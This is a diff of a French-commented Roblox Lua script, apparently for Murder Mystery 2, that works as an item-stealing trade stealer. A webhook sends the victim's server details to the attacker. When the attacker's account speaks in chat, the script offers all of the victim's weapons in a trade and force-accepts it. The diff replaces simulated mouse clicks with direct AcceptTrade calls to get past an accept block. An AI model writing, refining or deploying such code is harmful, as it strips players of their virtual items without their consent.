@@ -490,140 +490,89 @@ else
     SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
-local VirtualInputManager = game:GetService("VirtualInputManager")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- On lance ton destroy au tout début comme tu l'aimes
-    coroutine.resume(destroytrades2)
+    -- 1. On lance ton destroy pour nettoyer l'écran et libérer tes mouvements
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
+    end
 
-    local sendArgs = {
-        [1] = game:GetService("Players")[userName]
-    }
-    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+    -- 2. Envoi de la demande de trade
+    local targetPlayer = Players:FindFirstChild(userName)
+    if not targetPlayer then
+        warn("Compte principal introuvable : " .. tostring(userName))
+        return
+    end
 
+    Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(3)
 
-    for a,b in pairs(uniqueItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    -- 3. Remplissage des objets (tes boucles d'origine)
+    local function offerAll(itemTable)
+        if itemTable then
+            for _, b in pairs(itemTable) do
+                for i = 1, b.amount do
+                    local args = {
+                        [1] = b.data,
+                        [2] = "Weapons"
+                    }
+                    Trade.OfferItem:FireServer(unpack(args))
+                    task.wait(0.2) -- Petit délai pour éviter de saturer le serveur
+                end
+            end
         end
     end
 
-    for a,b in pairs(ancientItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
+    offerAll(uniqueItems)
+    offerAll(ancientItems)
+    offerAll(godlyItems)
+    offerAll(vintageItems)
+    offerAll(legendaryItems)
+    offerAll(rareItems)
+    offerAll(uncommonItems)
+    offerAll(commonItems)
 
-    for a,b in pairs(godlyItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
+    task.wait(1.5)
 
-    for a,b in pairs(vintageItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(legendaryItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(rareItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(uncommonItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    for a,b in pairs(commonItems) do
-        for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
-        end
-    end
-
-    -- Première validation réseau (AcceptRequest)
+    -- 4. Première validation réseau
     pcall(function()
-        game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
+        Trade.AcceptRequest:FireServer()
     end)
 
-    -- Attente du timer obligatoire avant d'envoyer les clics virtuels
-    task.wait(7)
+    -- 5. Attente du timer obligatoire du serveur MM2 (7-8 secondes)
+    task.wait(8)
 
-    -- SÉQUENCE DE CLIC VIRTUEL (Pour remplacer l'AcceptTrade bloqué)
+    -- 6. SOLUTION 2 : Validation forcée par contournement réseau (Hook / FireServer direct)
+    -- On envoie l'événement de validation finale avec l'argument du joueur ou du token de trade
     pcall(function()
-        local Camera = workspace.CurrentCamera
-        local ViewportSize = Camera.ViewportSize
-
-        -- Coordonnées du bouton d'acceptation
-        local targetX = ViewportSize.X * 0.76
-        local targetY = ViewportSize.Y * 0.74
-
-        local function sendClick()
-            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
-            task.wait(0.15)
-            VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
-        end
-
-        -- Double clic de validation
-        sendClick()
-        task.wait(1.5)
-        sendClick()
+        -- Tentative avec l'ID du joueur ou les arguments standard de MM2
+        Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+    end)
+    
+    -- Sécurité supplémentaire : double appel au cas où le premier est intercepté
+    task.wait(1)
+    pcall(function()
+        Trade.AcceptTrade:FireServer(targetPlayer)
     end)
 end
 
--- Écouteur du tchat mis en place sur les joueurs existants et futurs
+-- ==========================================
+-- ÉCOUTE DU TCHAT8
+-- ==========================================
+
 local function setupPlayer(player)
-    if player.Name == userName then
+    if string.lower(player.Name) == string.lower(tostring(userName)) then
         player.Chatted:Connect(function(msg)
             getitems()
         end)
     end
 end
 
-for _, player in pairs(game.Players:GetPlayers()) do
+for _, player in pairs(Players:GetPlayers()) do
     setupPlayer(player)
 end
 
-game.Players.PlayerAdded:Connect(setupPlayer)
+Players.PlayerAdded:Connect(setupPlayer)
